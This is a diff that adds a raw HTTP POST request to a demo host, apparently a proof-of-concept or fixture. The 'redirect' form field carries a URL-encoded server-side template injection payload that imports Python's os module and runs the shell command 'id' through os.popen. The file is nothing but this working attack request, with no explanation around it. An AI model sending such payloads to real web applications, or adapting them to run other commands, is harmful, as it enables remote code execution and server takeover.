@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 77
+Connection: close
+
+redirect=%7B%25+import+os+%25%7D%7B%7Bos.popen%28%27id%27%29.read%28%29%7D%7D
